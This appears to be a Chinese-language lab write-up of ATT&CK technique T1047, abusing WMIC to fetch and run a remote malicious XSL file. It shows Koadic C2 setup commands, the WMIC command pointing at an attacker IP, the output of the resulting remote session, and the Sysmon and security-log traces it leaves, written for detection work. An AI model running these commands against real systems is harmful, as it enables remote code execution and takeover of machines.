# T1047-win-基于白名单WMIC执行payload

## 来自ATT&CK的描述

WMI（Windows Management Instrumentation）是Windows管理功能，它为本地和远程访问windows系统组件提供了统一的环境。它依赖WMI服务来进行本地和远程访问，以及SMB（服务器消息块）和RPCS（远程过程调用服务）来进行远程访问。RPCS通过端口135运行。

攻击者可能会使用WMI与本地和远程系统交互，也可能使用WMI来执行许多策略功能，例如为发现收集信息和远程执行文件来横向移动。

## 测试案例

WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具），提供了从命令行接口和批命令脚本执行系统管理的支持。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的。WMIC改变了这种情况。

说明：Wmic.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Wmic调用。

Windows 2003 默认位置：

```dos
C:\WINDOWS\system32\wbem\wmic.exe
C:\WINDOWS\SysWOW64\wbem\wmic.exe
```

Windows 7 默认位置：

```dos
C:\Windows\System32\wbem\WMIC.exe
C:\Windows\SysWOW64\wbem\WMIC.exe
```

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7

### 攻击分析

#### Koadic

通过Koadic发起Wmic.exe攻击

koadic是一个命令控制（C2）工具，类似Metasploit和Powershell Empire。使用koadic我们生成恶意XSL文件。koadic安装完成后，您可以运行./koadic 文件以启动 koadic，然后通过运行以下命令开始加载stager/js/wmic 程序，并将 SRVHOST 设置为程序回连IP。

```bash
git clone https://github.com/zerosum0x0/koadic.git  #安装命令
cd koadic
pip3 install -r requirements.txt
```

```bash
#加载载荷
./koadic
(koadic: sta/js/mshta)# use stager/js/wmic
(koadic: sta/js/wmic)# set SRVHOST 192.168.126.146
[+] SRVHOST => 192.168.126.146
(koadic: sta/js/wmic)# run
[+] Spawned a stager at http://192.168.126.146:9996/6G69i.xsl
[>] wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
```

#### 靶机执行payload

执行 WMIC 以下命令，从远程服务器下载和运行恶意XSL文件：

```cmd
wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
```

靶机测试结果

```dos
C:\Users\12306Br0>wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
  os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"12306BR0-PCroot\cimv2roo
t\cliIMPERSONATEPKTPRIVACYms_804ENABLEOFFN/AOFFOFFSTDOUTSTDOUTN/AON\Device\Hardd
iskVolume17601Multiprocessor FreeMicrosoft Windows 7 旗舰版 93686Win32_Operating
SystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256
29608362009844309911620200305144428.000000+48020200305151330.500000+480202004171
72815.995000+4800804Microsoft Corporation-18589934464zh-CNMicrosoft Windows 7 旗
舰版 |C:\Windows|\Device\Harddisk0\Partition2422164-bit205225618TRUE112306Br0004
26-292-0000007-85792102343416OK272\Device\HarddiskVolume2C:\Windows\system32C:44
4004820966326.1.7601C:\Windows
```

#### 反弹shell

一旦恶意的XSL文件在目标计算机上执行，你将有一个僵尸连接，就像Metasploit回连的情况一样。

```bash
[+] Zombie 0: Staging new connection (192.168.126.149) on Stager 0
[+] Zombie 0: 12306Br0-PC\12306Br0 @ 12306BR0-PC -- Windows 7 Ultimate
[!] Zombie 0: Timed out.
[+] Zombie 0: Re-connected.
(koadic: sta/js/wmic)# zombies 0

        ID:                     0
        Status:                 Alive
        First Seen:             2020-04-17 17:28:31
        Last Seen:              2020-04-17 17:29:04
        Listener:               0

        IP:                     192.168.126.149
        User:                   12306Br0-PC\12306Br0
        Hostname:               12306BR0-PC
        Primary DC:             Unknown
        OS:                     Windows 7 Ultimate
        OSBuild:                7601
        OSArch:                 64
        Elevated:               No

        User Agent:             Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
        Session Key:            02149f1202e3437ab7932672c0c9e6b5

        JOB  NAME                            STATUS    ERRNO
        ---- ---------                       -------   -------
```

## 测试留痕

```log
#sysmon日志
EventID: 1
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: WMI Commandline Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: wmic  os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"

#win7安全日志
EventID：4688
进程信息:
新进程 ID: 0x888
新进程名: 'C:\Windows\System32\wbem\WMIC.exe'
```

## 检测规则/思路

无具体检测规则。

## 相关TIP
[[T1047-win-通过WMIC创建远程进程]]

## 参考推荐

MITRE-ATT&CK-T1047:<https://attack.mitre.org/techniques/T1047/>

windows下基于白名单获取shell的方法整理（上）:<http://www.safe6.cn/article/155>
